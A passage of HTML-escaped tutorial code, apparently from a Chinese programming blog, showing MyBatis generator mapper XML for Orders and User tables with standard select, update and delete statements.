      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.number != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        number = #{record.number,jdbcType=VARCHAR},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.createtime != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        createtime = #{record.createtime,jdbcType=TIMESTAMP},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.note != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        note = #{record.note,jdbcType=VARCHAR},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;set&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Update_By_Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;update&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;update &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateByExample&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;map&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    update orders
    set id = #{record.id,jdbcType=INTEGER},
      user_id = #{record.userId,jdbcType=INTEGER},
      number = #{record.number,jdbcType=VARCHAR},
      createtime = #{record.createtime,jdbcType=TIMESTAMP},
      note = #{record.note,jdbcType=VARCHAR}
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Update_By_Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;update&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;update &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateByPrimaryKeySelective&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.Orders&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    update orders
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;set &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;userId != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        user_id = #{userId,jdbcType=INTEGER},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;number != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        number = #{number,jdbcType=VARCHAR},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;createtime != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        createtime = #{createtime,jdbcType=TIMESTAMP},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;note != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        note = #{note,jdbcType=VARCHAR},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;set&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    where id = #{id,jdbcType=INTEGER}
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;update&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;update &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateByPrimaryKey&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.Orders&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    update orders
    set user_id = #{userId,jdbcType=INTEGER},
      number = #{number,jdbcType=VARCHAR},
      createtime = #{createtime,jdbcType=TIMESTAMP},
      note = #{note,jdbcType=VARCHAR}
    where id = #{id,jdbcType=INTEGER}
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;update&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;mapper&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;UserMapper.xml&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;109&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; &lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot; &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mapper &lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.mapper.UserMapper&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;resultMap &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;BaseResultMap&quot;&lt;/span&gt;&lt;span&gt; type&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.User&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;id &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;id&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;id&quot;&lt;/span&gt;&lt;span&gt; jdbcType&lt;/span&gt;&lt;span&gt;=&quot;INTEGER&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;username&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;username&quot;&lt;/span&gt;&lt;span&gt;
            jdbcType&lt;/span&gt;&lt;span&gt;=&quot;VARCHAR&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;birthday&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;birthday&quot;&lt;/span&gt;&lt;span&gt; jdbcType&lt;/span&gt;&lt;span&gt;=&quot;DATE&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;sex&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;sex&quot;&lt;/span&gt;&lt;span&gt; jdbcType&lt;/span&gt;&lt;span&gt;=&quot;CHAR&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;address&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;address&quot;&lt;/span&gt;&lt;span&gt; jdbcType&lt;/span&gt;&lt;span&gt;=&quot;VARCHAR&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;resultMap&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;sql &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;Example_Where_Clause&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;where&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;oredCriteria&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;criteria&quot;&lt;/span&gt;&lt;span&gt;
                separator&lt;/span&gt;&lt;span&gt;=&quot;or&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criteria.valid&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;trim &lt;/span&gt;&lt;span&gt;prefix&lt;/span&gt;&lt;span&gt;=&quot;(&quot;&lt;/span&gt;&lt;span&gt; suffix&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; prefixOverrides&lt;/span&gt;&lt;span&gt;=&quot;and&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;criteria.criteria&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;criterion&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;choose&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.noValue&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                                    and ${criterion.condition}
                                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.singleValue&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                                    and ${criterion.condition} #{criterion.value}
                                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.betweenValue&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                                    and ${criterion.condition} #{criterion.value} and
                                    #{criterion.secondValue}
                                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.listValue&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                                    and ${criterion.condition}
                                    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;criterion.value&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;listItem&quot;&lt;/span&gt;&lt;span&gt;
                                        open&lt;/span&gt;&lt;span&gt;=&quot;(&quot;&lt;/span&gt;&lt;span&gt; close&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; separator&lt;/span&gt;&lt;span&gt;=&quot;,&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                                        #{listItem}
                                    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                                &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;choose&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;trim&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;where&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;sql&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;sql &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;Update_By_Example_Where_Clause&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;where&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;example.oredCriteria&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;criteria&quot;&lt;/span&gt;&lt;span&gt;
                separator&lt;/span&gt;&lt;span&gt;=&quot;or&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criteria.valid&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;trim &lt;/span&gt;&lt;span&gt;prefix&lt;/span&gt;&lt;span&gt;=&quot;(&quot;&lt;/span&gt;&lt;span&gt; suffix&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; prefixOverrides&lt;/span&gt;&lt;span&gt;=&quot;and&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;criteria.criteria&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;criterion&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;choose&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.noValue&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                                    and ${criterion.condition}
                                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.singleValue&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                                    and ${criterion.condition} #{criterion.value}
                                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.betweenValue&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                                    and ${criterion.condition} #{criterion.value} and
                                    #{criterion.secondValue}
                                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.listValue&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                                    and ${criterion.condition}
                                    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;criterion.value&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;listItem&quot;&lt;/span&gt;&lt;span&gt;
                                        open&lt;/span&gt;&lt;span&gt;=&quot;(&quot;&lt;/span&gt;&lt;span&gt; close&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; separator&lt;/span&gt;&lt;span&gt;=&quot;,&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                                        #{listItem}
                                    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                                &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;choose&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;trim&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;where&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;sql&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;sql &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;Base_Column_List&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        id, username, birthday, sex, address
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;sql&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectByExample&quot;&lt;/span&gt;&lt;span&gt; resultMap&lt;/span&gt;&lt;span&gt;=&quot;BaseResultMap&quot;&lt;/span&gt;&lt;span&gt;
        parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.UserExample&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        select
        &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;distinct&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
            distinct
        &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Base_Column_List&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;&lt;span&gt;
        from user
        &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;orderByClause != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
            order by ${orderByClause}
        &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectByPrimaryKey&quot;&lt;/span&gt;&lt;span&gt; resultMap&lt;/span&gt;&lt;span&gt;=&quot;BaseResultMap&quot;&lt;/span&gt;&lt;span&gt;
        parameterType&lt;/span&gt;&lt;span&gt;=&quot;java.lang.Integer&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        select
        &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Base_Column_List&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;&lt;span&gt;
        from user
        where id = #{id,jdbcType=INTEGER}
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;delete &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;deleteByPrimaryKey&quot;&lt;/span&gt;&lt;span&gt;
        parameterType&lt;/span&gt;&lt;span&gt;=&quot;java.lang.Integer&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        delete from user
        where id = #{id,jdbcType=INTEGER}
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;delete&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;delete &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;deleteByExample&quot;&lt;/span&gt;&lt;span&gt;
        parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.UserExample&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        delete from user
        &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;delete&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
